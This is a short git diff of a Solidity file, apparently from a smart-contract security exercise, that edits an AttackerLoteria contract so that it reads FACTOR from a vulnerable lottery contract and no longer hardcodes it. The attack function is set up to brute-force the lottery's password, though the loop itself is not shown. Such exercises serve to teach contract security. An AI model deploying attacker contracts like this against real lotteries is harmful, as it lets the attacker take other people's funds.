@@ -67,14 +67,16 @@ contract LoteriaConPassword {
 }
 
 interface ILoteriaConPassword {
+    function FACTOR() external returns (uint256);
     function participarEnLoteria(uint8 password, uint256 _numeroGanador) external payable; 
 }
 
 contract AttackerLoteria {
-    uint256 public FACTOR = 104312904618913870938864605146322161834075447075422067288548444976592725436353;
 
     function attack(address _sc) public payable {
         ILoteriaConPassword loteria = ILoteriaConPassword(_sc);
+        
+        uint256 FACTOR = loteria.FACTOR();
 
         // Conseguir el passw con fuerza bruta
         uint8 passw;
